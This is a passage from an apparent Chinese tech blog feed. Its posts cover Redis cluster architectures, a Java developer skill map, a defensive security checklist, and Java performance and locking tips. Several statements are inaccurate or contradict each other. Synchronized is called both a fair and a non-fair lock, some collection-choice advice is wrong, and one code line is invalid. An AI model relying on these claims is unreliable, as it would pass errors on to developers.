        <content type="html"><![CDATA[<h2 id="Redis-集群原理"><a href="#Redis-集群原理" class="headerlink" title="Redis 集群原理"></a>Redis 集群原理</h2><p>redis 扩容三个阶段：</p><ul><li>单机: redis支撑万级</li><li>一主多从： 一主多从，开启读写分离，例如1主2从3哨兵模式 一般能到10万级，其实本质上还是属于单实例</li><li>多主集群：多主多从，客户端分片 可以达到千万级别</li></ul><h3 id="一主多从模式"><a href="#一主多从模式" class="headerlink" title="一主多从模式"></a>一主多从模式</h3><p>使用 Redis 自带的哨兵（Sentinel）集群对实例进行状态监控与 Failover。Sentinel 是 Redis 自带的高可用组件，将 Redis 注册到由多个 Sentinel 组成的 Sentinel 集群后，Sentinel 会对 Redis 实例进行健康检查，当 Redis 发生故障后，Sentinel 会通过 Gossip 协议进行故障检测，确认宕机后会通过一个简化的 Raft 协议来提升 Slave 成为新的 Master。</p><p><img src="/性能优化/performance/redis-performance/1500839-3bb8dac58b9fac75.jpg" alt="img"></p><p>仅使用 1 个 Slave 节点进行冷备，如果有读写分离请求，可以建立多个 Read only slave 来进行读写分离。</p><p>如上图所示，通过向 Sentinel 集群注册 Master 节点实现实例的高可用，当提交 Master 实例的连接信息后，Sentinel 会主动探测所有的 Slave 实例并建立连接，定期检查健康状态。客户端通过多种资源发现策略如简单的 DNS 发现 Master 节点，将来有计划迁移到如 Consul 或 etcd 等资源发现组件 。</p><p>注意事项：</p><ul><li>只读 Slave 节点可以按照需求设置 slave-priority 参数为 0，防止故障切换时选择了只读节点而不是热备 Slave 节点；</li><li>Sentinel 进行故障切换后会执行 CONFIG REWRITE 命令将 SLAVEOF 配置落地，如果 Redis 配置中禁用了 CONFIG 命令，切换时会发生错误，可以通过修改 Sentinel 代码来替换 CONFIG 命令；</li><li>Sentinel Group 监控的节点不宜过多，实测超过 500 个切换过程偶尔会进入 TILT 模式，导致 Sentinel 工作不正常，推荐部署多个 Sentinel 集群并保证每个集群监控的实例数量小于 300 个；</li><li>Master 节点应与 Slave 节点跨机器部署，有能力的使用方可以跨机架部署，不推荐跨机房部署 Redis 主从实例；</li><li>Sentinel 切换功能主要依赖 down-after-milliseconds 和 failover-timeout 两个参数，down-after-milliseconds 决定了 Sentinel 判断 Redis 节点宕机的超时，使用 30000 作为阈值。而 failover-timeout 则决定了两次切换之间的最短等待时间，如果对于切换成功率要求较高，可以适当缩短 failover-timeout 到秒级保证切换成功，具体详见 Redis 官方文档；</li><li>单机网络故障等同于机器宕机，但如果机房全网发生大规模故障会造成主从多次切换，此时资源发现服务可能更新不够及时，需要人工介入。</li></ul><h3 id="多主集群模式"><a href="#多主集群模式" class="headerlink" title="多主集群模式"></a>多主集群模式</h3><p>redis 目前主流有三个集群方案可以选择：</p><ul><li>redis cluster  官方的集群方案</li><li>Twemproxy 推特、知乎在用</li><li>codis 豌豆荚团队开发</li></ul><h4 id="redis-cluster-官方集群"><a href="#redis-cluster-官方集群" class="headerlink" title="redis cluster 官方集群"></a>redis cluster 官方集群</h4><p>一组Redis Cluster是由多个Redis实例组成，官方推荐我们使用6实例，其中3个为主节点，3个为从结点。</p><p>一旦有主节点发生故障的时候，Redis Cluster可以选举出对应的从结点成为新的主节点，继续对外服务，从而保证服务的高可用性。那么对于客户端来说，知道知道对应的key是要路由到哪一个节点呢？原来，Redis Cluster 把所有的数据划分为16384个不同的槽位，可以根据机器的性能把不同的槽位分配给不同的Redis实例，对于Redis实例来说，他们只会存储部门的Redis数据，当然，槽的数据是可以迁移的，不同的实例之间，可以通过一定的协议，进行数据迁移。</p><p><img src="/性能优化/performance/redis-performance/377adab44aed2e73e06d2f3d2de6fe8e86d6fa0c.png" alt="img"></p><p>客户端是如何访问Redis Cluster里面的数据呢？首先客户端需要保存一份Redis Cluster槽相关的信息，也就是路由表，然后对即将访问的key进行哈希计算，计算出对应的槽位，然后向对应的Redis实例发起查询请求。如果访问的Redis实例中，的确保存着对应槽的数据信息，就会进行返回，否则向客户端返回一个Moved指令，让客户端到正确的地址进行获取。</p><h5 id="槽位算法"><a href="#槽位算法" class="headerlink" title="槽位算法"></a>槽位算法</h5><p>槽位的信息是通过 CRC16 实现的，如果给 key 增加 tag 还可以强制 key 所挂的操作等于 tag 所在的槽位。</p><pre><code class="shell">&gt; CLUSTER KEYSLOT somekey11058&gt; CLUSTER KEYSLOT foo{hash_tag}(integer) 2515&gt; CLUSTER KEYSLOT bar{hash_tag}(integer) 2515</code></pre><p>参考文档：<a href="https://redis.io/commands/cluster-keyslot" target="_blank" rel="noopener">https://redis.io/commands/cluster-keyslot</a></p><h5 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h5><p>当客户端向一个错误的节点发出指令后，该节点就会发现该指令的 key 所在的槽位并不归自己管理，这时服务器会发送一个特殊的跳转指令，告诉客户端去连接新的节点获取数据。</p><pre><code class="shell">GET X-MOVED 3333 127.0.0.1:6381</code></pre><h5 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h5><p>如果需要对集群中的 keys 迁移到另外一个服务器，可以使用 redis-trib 工具，该工具是由 ruby 编写，可以方便的完成迁移工作。</p><h5 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h5><p>Redis 集群可以为每个主节点设置多个从节点，当主节点发生故障，集群可以将其中一个节点提升为主节点。</p><h5 id="网络抖动设置"><a href="#网络抖动设置" class="headerlink" title="网络抖动设置"></a>网络抖动设置</h5><p>现实的网络会发生抖动，也就是偶尔不可达，但随后能通信，因此需要一个阈值决定是否真的发生了宕机。</p><p>这个值可以设置:</p><blockquote><p>Cluster-slave-validity-factor</p></blockquote><p>如果这个值为 0  集群不会抗拒网络抖动，会发生主从切换，如果这个值大于0，集群会通过重试确认主从。</p><h4 id="codis"><a href="#codis" class="headerlink" title="codis"></a>codis</h4><p>Codis是一个分布式Redis解决方案,对于上层的应用来说,连接到Codis Proxy和连接原生的RedisServer没有明显的区别,有部分命令不支持。Codis底层会处理请求的转发,不停机的数据迁移等工作,所有后边的一切事情,对于前面的客户端来说是透明的,可以简单的认为后边连接的是一个内存无限大的Redis服务.</p><p><img src="/性能优化/performance/redis-performance/5BD68FB50A584D53A186F0FC5C81212D.png" alt="image"></p><p>codis 组成部分：</p><ul><li>Codis-proxy: 实现redis协议,由于本身是无状态的,因此可以部署很多个节点</li><li>Codis-config :是codis的管理工具,包括添加/删除redis节点添加删除proxy节点,发起数据迁移等操作,自带httpserver,支持管理后台方式管理配置</li><li>Codis-server :是codis维护的redis分支,基于2.8.21分支,加入了slot的支持和原子的数据迁移指令; codis-proxy和codis-config只能和这个版本的redis交互才能正常运行</li><li>Coordination：支持 Zookeeper 或者 etcd</li></ul><p>使用 codis 的优势：</p><ul><li>对客户端透明,与codis交互方式和redis本身交互一样</li><li>支持在线数据迁移,迁移过程对客户端透明有简单的管理和监控界面</li><li>支持高可用,无论是redis数据存储还是代理节点</li><li>自动进行数据的均衡分配</li><li>最大支持1024个redis实例,存储容量海量</li><li>高性能</li></ul><p>使用了 codis 带来的限制：</p><ul><li>最大支持1024个redis实例 （redis cluster支持的槽位更多）</li><li>采用自有的redis分支,不能与原版的redis保持同步</li><li>某些命令不支持,比如事务命令、muti</li><li>redis 实例和单机相比下降 20% </li><li>国内开源产品,活跃度相对弱一些</li></ul><h4 id="数据指标"><a href="#数据指标" class="headerlink" title="数据指标"></a>数据指标</h4><p>官方数据表示Redis读的速度是110000次/s,写的速度是81000次/s 。</p><h3 id="大厂案例"><a href="#大厂案例" class="headerlink" title="大厂案例"></a>大厂案例</h3><h4 id="知乎-redis-优化情况"><a href="#知乎-redis-优化情况" class="headerlink" title="知乎 redis 优化情况"></a>知乎 redis 优化情况</h4><p>目前，Redis 在知乎的应用规模如下：</p><p>1）机器内存总量约 70TB，实际使用内存约 40TB；</p><p>2）平均每秒处理约 1500 万次请求，峰值每秒约 2000 万次请求；</p><p>3）每天处理约 1 万亿余次请求；</p><p>4）单集群每秒处理最高每秒约 400 万次请求；</p><p>5）集群实例与单机实例总共约 800 个；</p><p>6）实际运行约 16000 个 Redis 实例；</p><p>7）Redis 使用官方 3.0.7 版本，少部分实例采用 4.0.11 版本。</p><p>采用的是 Twemproxy 集群方案。</p><p><img src="/性能优化/performance/redis-performance/1500839-504df1bcc0e9cda3.jpg" alt="img"></p><h3 id="redis-常用工具"><a href="#redis-常用工具" class="headerlink" title="redis 常用工具"></a>redis 常用工具</h3><h4 id="redis-测试性能测试"><a href="#redis-测试性能测试" class="headerlink" title="redis 测试性能测试"></a>redis 测试性能测试</h4><p>用于性能测试</p><blockquote><p>./redis-benchmark -h 127.0.0.1 -p 6379 -d 1000 -c 100 -n 100000</p></blockquote><h4 id="redis-monitor"><a href="#redis-monitor" class="headerlink" title="redis monitor"></a>redis monitor</h4><p>用于redis 运行情况的监控</p><blockquote><p>redis 127.0.0.1:6379&gt; MONITOR </p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/imstudy/p/9668257.html" target="_blank" rel="noopener">https://www.cnblogs.com/imstudy/p/9668257.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web 方向技术核心</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/java-web-skill/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/java-web-skill/</url>
      
        <content type="html"><![CDATA[<p>职场上，技术应该像一个同心圆一样，核心的部分代表你有没有饭吃，周围的东西代表了你能比别人做的好。首先要保证核心技能，再拓展周围技能。对程序员来说，核心技术就是编程语言、数据库、linux等，周边技能像管理、英语、沟通等属于加分项。</p><p>如果你定位是 Java 程序员，那么知识结构应该如下：</p><table><thead><tr><th></th><th>技能点</th><th>学习材料</th><th>验收</th></tr></thead><tbody><tr><td>Nice to have</td><td>英语<br><br>团队管理<br>技术架构<br><br>性能优化<br><br>Devops<br>DDD<br>UML<br>JVM 调优</td><td></td><td>能做到 TL ，并能承担海外项目主要能力</td></tr><tr><td>Java 应用层</td><td>Java <br>linux<br>spring boot<br>MySQL<br>Redis<br>RocketMQ</td><td></td><td>成为合格的 Java developer<br>能完成：<br>日常开发<br>DEBUG<br>总结这些技术的脚手架<br>对源码有一定了解</td></tr><tr><td>计算机科学层</td><td>计算机网络<br>数据结构<br>算法<br>操作系统<br>网络协议</td><td></td><td>内功，熟悉各种：<br>网络协议<br>基本算法<br>操作系统结构<br>数据库原理<br></td></tr></tbody></table><p>学习的过程应该是一个 PDCA 闭环，计划、学习、检查、处理形成一个闭环。</p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全红线参考</title>
      <link href="/%E5%AE%89%E5%85%A8/security/red-line/"/>
      <url>/%E5%AE%89%E5%85%A8/security/red-line/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="安全通道"><a href="#安全通道" class="headerlink" title="安全通道"></a>安全通道</h3><ol><li>用户测不允许直接连接到管理系统</li><li>无任何隐藏通道</li><li>关闭高危端口</li></ol><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><ol><li>所有的网络端口都是业务必须的，动态监听的端口都应该被关闭</li><li>所有的网络连接都需要有认证机制</li></ol><h3 id="web-安全"><a href="#web-安全" class="headerlink" title="web 安全"></a>web 安全</h3><ol><li>每一个需要用户授权的网络请求，都需要鉴权。必须核实用户的会话标识是否合法。</li><li>对用户的最终认证必须发生在服务器端。</li><li>服务器对所有来自不可信数据源的数据进行校验（注入攻击），拒绝任何没通过校验的数据。若输出到客户端的数据来自不可信的数据源，都必须进行编码和转义（XSS攻击）。</li><li>必须使用 web 安全扫描软件对容器和应用进行安全扫描，并解决高风险的漏洞。</li><li>Session ID必须具有随机性、唯一性，身份验证成功后需要更换 Session ID。</li><li>文件上传需要对类型进行验证，应当正确使用 MIME 检查。</li></ol><h3 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h3><ol><li>禁止使用默认口令</li><li>用户应该具有最小权限，不允许使用超级用户访问所有的数据库</li><li>如果存在多个默认账号，应该禁用无用的账号</li></ol><h3 id="编码安全"><a href="#编码安全" class="headerlink" title="编码安全"></a>编码安全</h3><ol><li>数据库等凭据不允许明文存储在应用程序中</li><li>非信任的网络传输应该使用 HTTPS</li><li>系统中对接必须使用公有账号</li><li>禁止使用私有加密算法</li></ol><h2 id="口令策略"><a href="#口令策略" class="headerlink" title="口令策略"></a>口令策略</h2><h3 id="口令复杂度"><a href="#口令复杂度" class="headerlink" title="口令复杂度"></a>口令复杂度</h3><ol><li>口令至少5个字符</li><li>口令包含如下规则<ol><li>至少一个小写字母</li><li>至少一个大写字母</li><li>至少一个数字</li><li>至少一个特殊字符</li></ol></li><li>口令不能和账号一样</li><li>口令不能被重复使用</li><li>*例外情况不要求强制复杂度<ol><li>输入受限，例如无法使用3完整的键盘</li><li>业界习惯，例如手机 PIN 码</li></ol></li></ol><h3 id="防暴力破解机制"><a href="#防暴力破解机制" class="headerlink" title="防暴力破解机制"></a>防暴力破解机制</h3><p>超过一定阈值（例如5次尝试）启动防暴力破解机制：</p><ol><li>锁定账号</li><li>锁定IP</li><li>登录延迟</li><li>验证码识别</li><li>白名单</li></ol><h3 id="口令安全规则"><a href="#口令安全规则" class="headerlink" title="口令安全规则"></a>口令安全规则</h3><ol><li>口令禁止回显</li><li>输入框不允许拷贝</li><li>缺省密码符合复杂度要求</li><li>用户修改自己口令必须验证旧口令或者 OTP 验证</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-overview/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-overview/</url>
      
        <content type="html"><![CDATA[<h2 id="性能优化的维度"><a href="#性能优化的维度" class="headerlink" title="性能优化的维度"></a>性能优化的维度</h2><ul><li>程序设计优化 </li><li>Java 代码调优</li><li>JVM 调优</li><li>数据库调优</li><li>操作系统调优</li></ul><h2 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h2><ul><li>JMH Java 性能测试</li><li>数据性能测试</li></ul><h3 id="常用指标和计算公式"><a href="#常用指标和计算公式" class="headerlink" title="常用指标和计算公式"></a>常用指标和计算公式</h3><h4 id="QPS-计算公式"><a href="#QPS-计算公式" class="headerlink" title="QPS 计算公式"></a>QPS 计算公式</h4><blockquote><p>QPS = (1 / t ) * n</p></blockquote><p>一秒内可以处理的请求数量称之为服务器的QPS。</p><p>上面我们计算了10000个请求的耗时，那么反过来计算每秒处理多少请求则</p><p>如果一次性可以处理100个请求，每个请求耗时100毫秒，则qps = 1000</p><p>如果一次性可以处理50个请求，每个请求耗时200毫秒，则qps = 250</p><h2 id="程序设计优化"><a href="#程序设计优化" class="headerlink" title="程序设计优化"></a>程序设计优化</h2><h3 id="缓冲技术"><a href="#缓冲技术" class="headerlink" title="缓冲技术"></a>缓冲技术</h3><p>缓冲技术用于协调不同系统之间的性能差异。例如文件流写入磁盘的速度慢，程序就会阻塞，缓冲像一个漏斗，先存放到内存，应用程序可以完成操作，缓冲慢慢释放内容到文件。缓冲可以大幅度提高 IO 效率。</p><h4 id="BufferedWriter"><a href="#BufferedWriter" class="headerlink" title="BufferedWriter"></a>BufferedWriter</h4><p>用于包装 writer，构造函数的第二个参数可以指定缓冲区大小，默认为 8K。</p><pre><code class="java">BufferedWriter bw = new BufferedWriter(new FileWriter(new File(&quot;test.txt&quot;))) ;bw.write(&quot;hello&quot;);bw.write(&quot;world&quot;);bw.flush();bw.close();</code></pre><h4 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h4><p>用于包装输出流，构造函数的第二个参数可以指定缓冲区大小，默认为 8K。</p><pre><code class="java">FileOutputStream fos=new FileOutputStream(&quot;test.txt&quot;);BufferedOutputStream bos=new BufferedOutputStream(fos);String content=&quot;hello world！&quot;;bos.write(content.getBytes(),0,content.getBytes().length);bos.flush();bos.close();</code></pre><h3 id="缓存技术"><a href="#缓存技术" class="headerlink" title="缓存技术"></a>缓存技术</h3><p>不一定是所有从数据库读出的数据才需要缓存，很多数据都可以被缓存，例如网络请求、复杂计算，这些数据可以被零时缓存到内存中。</p><h4 id="EhCache-进程内缓存"><a href="#EhCache-进程内缓存" class="headerlink" title="EhCache 进程内缓存"></a>EhCache 进程内缓存</h4><p>mybatis、shiro、hibernate 中的一级缓存都是 EhCache。默认内存缓存，可以配置为磁盘、外部介质。</p><p>远程 API 操作</p><pre><code>// 1. 创建缓存管理器CacheManager cacheManager = CacheManager.create(&quot;./src/main/resources/ehcache.xml&quot;);// 2. 获取缓存对象Cache cache = cacheManager.getCache(&quot;HelloWorldCache&quot;);// 3. 创建元素Element element = new Element(&quot;key1&quot;, &quot;value1&quot;);// 4. 将元素添加到缓存cache.put(element);// 5. 获取缓存Element value = cache.get(&quot;key1&quot;);System.out.println(value);System.out.println(value.getObjectValue());// 6. 删除元素cache.remove(&quot;key1&quot;);</code></pre><h5 id="使用Spring-注解操作"><a href="#使用Spring-注解操作" class="headerlink" title="使用Spring 注解操作"></a>使用Spring 注解操作</h5><p><strong>@Cacheable</strong>  </p><p>修饰的方法执行后就将返回值放入缓存，不再执行。表明所修饰的方法是可以缓存的，这个注解可以用condition属性来设置条件</p><pre><code class="java">@Cacheable(value=&quot;UserCache&quot;, key=&quot;&#39;user:&#39; + #userId&quot;)    public User findById(String userId) {        return (User) new User(&quot;1&quot;, &quot;mengdee&quot;);           }    </code></pre><p><strong>@CacheEvict</strong></p><p>和 Cacheable 相反，执行后根据规则清空缓存。</p><pre><code class="java">@CacheEvict(value=&quot;UserCache&quot;,key=&quot;&#39;user:&#39; + #userId&quot;)    public void removeUser(User user) {        System.out.println(&quot;UserCache&quot;+user.getUserId());    }    </code></pre><h3 id="池化技术"><a href="#池化技术" class="headerlink" title="池化技术"></a>池化技术</h3><h4 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h4><p>java中的对象池技术，是为了方便快捷地创建某些对象而出现的，当需要一个对象时，就可以从池中取一个出来（如果池中没有则创建一个），则在需要重复重复创建相等变量时节省了很多时间。</p><p>Java 中数据类型的包装类型支持基本的对象池技术。</p><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>多线程可以充分利用多核 CPU 的使用率。使用线程池可以大幅度提高多线程性能，下面是一个线程池的例子，推荐使用 Executors 创建线程：</p><pre><code class="java">ExecutorService executor = Executors.newFixedThreadPool(10);executor.execute(new MyThread());executor.shutdown;</code></pre><p>线程池的数量非常重要，《Java 并发编程实践》中给出了一个公式</p><ul><li><p>Ncpu = CPU 的数量</p></li><li><p>Ucpu = 目标 CPU 的使用率</p></li><li><p>W/C = 等待时间与计算时间的比率</p></li><li><p>Nthreads  = 合理的线程数量 </p></li></ul><blockquote><p> Nthreads = Ncpu <em> Ucpu </em> (1 + W/C)</p></blockquote><h4 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h4><p>数据库连接池使用 C3P0、DBCP、HikariCP和Druid，spring 推荐使用 DBCP，但是 Druid 支持监控，可以对慢 SQL 进行分析。</p><h2 id="Java-代码调优"><a href="#Java-代码调优" class="headerlink" title="Java 代码调优"></a>Java 代码调优</h2><h3 id="字符串优化"><a href="#字符串优化" class="headerlink" title="字符串优化"></a>字符串优化</h3><h4 id="优先使用字面量，而不是-new-String"><a href="#优先使用字面量，而不是-new-String" class="headerlink" title="优先使用字面量，而不是 new String();"></a>优先使用字面量，而不是 new String();</h4><pre><code>String str = &quot;&quot;;// 优于String str1 = new String();</code></pre><h4 id="优先使用-StringTokenizer-分隔字符串"><a href="#优先使用-StringTokenizer-分隔字符串" class="headerlink" title="优先使用 StringTokenizer 分隔字符串"></a>优先使用 StringTokenizer 分隔字符串</h4><h4 id="只用-charAt-进行字符串比较"><a href="#只用-charAt-进行字符串比较" class="headerlink" title="只用 charAt 进行字符串比较"></a>只用 charAt 进行字符串比较</h4><h4 id="优先使用-StringBuilder-和-StringBuffer"><a href="#优先使用-StringBuilder-和-StringBuffer" class="headerlink" title="优先使用 StringBuilder 和 StringBuffer"></a>优先使用 StringBuilder 和 StringBuffer</h4><h3 id="合理选用数据结构"><a href="#合理选用数据结构" class="headerlink" title="合理选用数据结构"></a>合理选用数据结构</h3><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>ArrayList 通过数组实现，每次扩容会造成大量的性能消耗，适合读多写少的操作，注意设置初始数组大小。</p><p>LinkedList 通过双向链表实现，查询效率低，写入速度快，适合写多读少。</p><p>Vector ArrayList 的线程安全实现，性能相差无几, 适合写多读少的场景。</p><p>CopyOnWriteArray 通过 COW 技术实现线程安全的实现，适合读多写少操作。</p><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>HashMap 注意设置负载因子降低冲突</p><p>LinkedHaspMap 在读取时排序，内部基于链表，适合写多读少</p><p>TreeMap 实现了 sortedMap 满足对有序性的需求，在写入时排序，内部基于红黑树，适合读多写少</p><p>ConcurrentHashMap 是线程安全且高性能的额 Map 容器，使用了 CAS、红黑树、分段锁等技术。</p><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p>满足 Map 的无重复性需求</p><p>HashSet，对应 HashMap，基于hash的快速插入</p><p>LinkedHashSet，对应 LinkedHashMap，基于 hash 的插入，维护了插入集合的先后顺序个。按照先进先出的顺序排序</p><p>TreeSet，对应 Tree Map 基于红黑树的实现。有高效的元素 key 的排序算法</p><h4 id="RandomAccess-随机访问接口"><a href="#RandomAccess-随机访问接口" class="headerlink" title="RandomAccess 随机访问接口"></a>RandomAccess 随机访问接口</h4><p>用于标记是是否支持随机访问，提高代码性能：</p><pre><code>if(list isntanceof RandomAccess){    // 随机访问}else{    // 老老实实使用迭代器 }</code></pre><h3 id="使用-NIO"><a href="#使用-NIO" class="headerlink" title="使用 NIO"></a>使用 NIO</h3><p>TODO </p><h3 id="合理使用引用类型"><a href="#合理使用引用类型" class="headerlink" title="合理使用引用类型"></a>合理使用引用类型</h3><h4 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h4><p>Java默认的引用方式，存在引用的情况下可以不会被回收。</p><h4 id="软引用"><a href="#软引用" class="headerlink" title="软引用"></a>软引用</h4><p>通过 SoftReference 使用软引用，当 内存达到一定阈值，GC会回收。</p><h3 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h3><p>GC 运行时会被回收，但是 GC 不会随时运行，因此可以利用这个特性实现某些缓存机制。</p><p>某些数据（缓存）放到一个超大的 map中会造成内存泄露，因此可以使用 WeakHashMap 来自动释放。</p><h4 id="虚引用"><a href="#虚引用" class="headerlink" title="虚引用"></a>虚引用</h4><p>深入理解JAVA虚拟机一书中有这样一句描述：<strong>“为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知”。</strong></p><p>虚引用更多的是用于对象回收的监听。</p><ol><li>重要对象回收监听 进行日志统计</li><li>系统gc监听 因为虚引用每次GC都会被回收，那么我们就可以通过虚引用来判断gc的频率，如果频率过大，内存使用可能存在问题，才导致了系统gc频繁调用</li></ol><h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><h4 id="少使用异常"><a href="#少使用异常" class="headerlink" title="少使用异常"></a>少使用异常</h4><h4 id="使用局部变量"><a href="#使用局部变量" class="headerlink" title="使用局部变量"></a>使用局部变量</h4><p>局部变量在栈中，类变量在堆中。</p><h4 id="使用位运算"><a href="#使用位运算" class="headerlink" title="使用位运算"></a>使用位运算</h4><p>使用移位运算代替乘法除法（计算机实现原理）</p><h4 id="替换-switch"><a href="#替换-switch" class="headerlink" title="替换 switch"></a>替换 switch</h4><h4 id="一维数组代替二维数组"><a href="#一维数组代替二维数组" class="headerlink" title="一维数组代替二维数组"></a>一维数组代替二维数组</h4><h4 id="使用-arrayCopy"><a href="#使用-arrayCopy" class="headerlink" title="使用 arrayCopy"></a>使用 arrayCopy</h4><h4 id="使用-Buffer-对-IO进行包装"><a href="#使用-Buffer-对-IO进行包装" class="headerlink" title="使用 Buffer 对 IO进行包装"></a>使用 Buffer 对 IO进行包装</h4><h4 id="使用-clone-代替new"><a href="#使用-clone-代替new" class="headerlink" title="使用 clone() 代替new"></a>使用 clone() 代替new</h4><p>clone 会绕过构造函数</p><h4 id="静态方法代替实例方法"><a href="#静态方法代替实例方法" class="headerlink" title="静态方法代替实例方法"></a>静态方法代替实例方法</h4><h2 id="并发调优"><a href="#并发调优" class="headerlink" title="并发调优"></a>并发调优</h2><h3 id="并发基础"><a href="#并发基础" class="headerlink" title="并发基础"></a>并发基础</h3><h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>线程会对变量局部更新，提高性能。volatile 变量可见性保证，这是并发编程的基础</p><ul><li>其他线程对变量的修改，理解反应到当前线程中</li><li>确保当前线程对 volatile 的修改，能即时写回共享主内存中，并被其他线程所见</li><li>使用 volatile 声明的变量，编译器会保证有序性</li></ul><h4 id="同步关键字-synchronized"><a href="#同步关键字-synchronized" class="headerlink" title="同步关键字 synchronized"></a>同步关键字 synchronized</h4><p>Java 中最基本的锁机制，可以锁方法、变量、类、静态方法等资源， synchronized 为公平锁。</p><h4 id="线程局部变量-ThreadLocal"><a href="#线程局部变量-ThreadLocal" class="headerlink" title="线程局部变量 ThreadLocal"></a>线程局部变量 ThreadLocal</h4><p>线程执行时独立的内存空间，在某些业务场景下可以用来实现并发操作，避免锁的使用。</p><h4 id="信号量-Semaphore"><a href="#信号量-Semaphore" class="headerlink" title="信号量 Semaphore"></a>信号量 Semaphore</h4><p>锁是对单个资源的控制，型号量可以对一组资源管理，例如 100 个线程的线程池，可以定义一个型号量 100，当型号量小于 100 时，请求才允许被加入。</p><h3 id="锁优化"><a href="#锁优化" class="headerlink" title="锁优化"></a>锁优化</h3><h4 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h4><ul><li>乐观锁/悲观锁<ul><li>乐观锁：就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据。典型的是使用版本号更新前判断。<code>update xxx when version =xxx;</code>如果版本号不匹配更新失败。在Java中 CAS 就是乐观锁。</li><li>悲观锁：总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁。synchronized 就是悲观锁，mysql 中就是 readForUpdate 语句。</li></ul></li><li>独享锁/共享锁<ul><li>独享锁是指该锁一次只能被一个线程所持有，例如 Synchronize、ReentrantLock。</li><li>共享锁是指该锁可被多个线程所持有。</li></ul></li><li>互斥锁/读写锁<ul><li>互斥锁在Java中的具体实现就是ReentrantLock。</li><li>读写锁在Java中的具体实现就是ReadWriteLock、ReentrantReadWriteLock</li></ul></li><li>可重入锁<ul><li>上锁后每个访问的线程都需要排队，可重入的意思是已经获取锁的线程再次进入无需排队，避免死锁。可重入锁又名递归锁，是指在同一个线程在外层方法获取锁的时候，在进入内层方法会自动获取锁。</li></ul></li><li>公平锁/非公平锁<ul><li>公平锁是指多个线程按照申请锁的顺序来获取锁。ReetrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。</li><li>非公平锁是指多个线程获取锁的顺序并不是按照申请锁的顺序，按照CPU运行时间片来划分的。ReetrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。Synchronized 也是一种非公平锁，无法变成公平锁。</li></ul></li><li>分段锁<ul><li>分段锁其实是一种锁的设计，并不是具体的一种锁。ConcurrentHashMap而言，其并发的实现就是通过分段锁的形式来实现高效的并发操作。ConcurrentHashMap中的分段锁称为Segment，它即类似于HashMap（JDK7和JDK8中HashMap的实现）的结构，即内部拥有一个Entry数组，数组中的每个元素又是一个链表。当需要put元素的时候，并不是对整个hashmap进行加锁，而是先通过hashcode来知道他要放在哪一个分段中，然后对这个分段进行加锁，所以当多线程put的时候，只要不是放在一个分段中，就实现了真正的并行的插入。统计 Size 的时候需要全局加锁才能统计</li></ul></li><li>偏向锁/轻量级锁/重量级锁<ul><li>这三种锁是指锁的状态，并且是针对Synchronized。</li><li>偏向锁是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁。</li><li>轻量级锁是指当锁是偏向锁的时候，被另一个线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞。</li><li>重量级锁是指当锁为轻量级锁的时候，另一个线程虽然是自旋，但自旋不会一直持续下去，当自旋一定次数的时候，还没有获取到锁，就会进入阻塞，该锁膨胀为重量级锁。</li></ul></li><li>自旋锁<ul><li>在Java中，自旋锁是指尝试获取锁的线程不会立即阻塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上下文切换的消耗，缺点是循环会消耗CPU。</li></ul></li></ul><h4 id="AQS-技术"><a href="#AQS-技术" class="headerlink" title="AQS 技术"></a>AQS 技术</h4><p>AbstractQueuedSynchronized 抽象队列式的同步器，AQS定义了一套多线程访问共享资源的同步器框架，许多同步类实现都依赖于它，如常用的ReentrantLock/Semaphore/CountDownLatch</p><p><img src="/性能优化/performance/performance-overview/721070-20170504110246211-10684485.png" alt="img"></p><p>想要获取锁的线程通过 CAS 